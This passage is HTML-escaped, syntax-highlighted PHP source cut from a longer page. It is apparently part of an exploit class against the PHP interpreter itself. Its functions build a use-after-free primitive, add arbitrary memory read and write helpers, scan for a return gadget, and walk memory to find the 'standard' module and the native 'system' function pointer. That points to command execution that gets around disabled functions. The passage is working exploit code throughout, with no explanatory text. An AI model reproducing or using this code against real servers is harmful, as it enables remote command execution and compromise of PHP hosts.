class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;uafp = fopen(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php://memory&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        fputs(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;uafp, pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;QQQ&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xDEADBAADC0DE&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; STRING_SIZE; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            fputs(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;uafp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;prepare_leaker&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$str_off&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off + CHUNK_SIZE + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$str_off&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$str_off&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$val_off&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off + &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$val_off&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_addr + CHUNK_SIZE + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-variable&#34;&gt;$val_off&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xA&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;prepare_cleanup&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$binary_leak&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$ret_gadget&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$binary_leak&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            --&lt;span class=&#34;hljs-variable&#34;&gt;$ret_gadget&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$ret_gadget&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) !== &lt;span class=&#34;hljs-number&#34;&gt;0xC3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ret gadget = 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$ret_gadget&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc_addr + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt; - (PHP_MAJOR_VERSION === &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; ? &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$ret_gadget&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper_off + CHUNK_SIZE + &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt; = strlen(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;helper-&amp;gt;c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; !== &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &amp;#123; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt; &amp;amp;= (&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; (&lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;)) - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$v&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc[&lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; + &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;] = chr(&lt;span class=&#34;hljs-variable&#34;&gt;$v&lt;/span&gt; &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$v&lt;/span&gt; &amp;gt;&amp;gt;= &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_basic_funcs&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-comment&#34;&gt;// In rare instances the standard module might lie after the addr we&amp;#x27;re starting&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-comment&#34;&gt;// the search from. This will result in a SIGSGV when the search reaches an unmapped page.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-comment&#34;&gt;// In that case, changing the direction of the search should fix the crash.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-comment&#34;&gt;// $addr += 0x10;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; -= &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) === &lt;span class=&#34;hljs-number&#34;&gt;0xA8&lt;/span&gt; &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                in_array(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                    [&lt;span class=&#34;hljs-number&#34;&gt;20151012&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20160303&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20170718&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20180731&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20190902&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20200930&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$module_name_addr&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-variable&#34;&gt;$module_name&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$module_name_addr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$module_name&lt;/span&gt; === &lt;span class=&#34;hljs-number&#34;&gt;0x647261646e617473&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;log(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;standard module @ 0x%x&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get_system&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$basic_funcs&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$basic_funcs&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$f_entry&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$f_name&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$f_entry&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$f_name&lt;/span&gt; === &lt;span class=&#34;hljs-number&#34;&gt;0x6d6574737973&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read(&lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$addr&lt;/span&gt; += &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$f_entry&lt;/span&gt; !== &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;cleanup&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;hfp = fopen(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php://memory&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        fputs(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;hfp, pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;QQ&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc_addr));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; FILTER_SIZE - &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            fputs(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;hfp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;str2ptr&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$address&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt; &amp;gt;= &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt;--) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$address&lt;/span&gt; &amp;lt;&amp;lt;= &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$address&lt;/span&gt; |= ord(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;abc[&lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; + &lt;span class=&#34;hljs-variable&#34;&gt;$j&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$address&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ptr2str&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ptr&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$out&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;hljs-variable&#34;&gt;$n&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$out&lt;/span&gt; .= chr(&lt;span class=&#34;hljs-variable&#34;&gt;$ptr&lt;/span&gt; &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$ptr&lt;/span&gt; &amp;gt;&amp;gt;= &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$out&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span 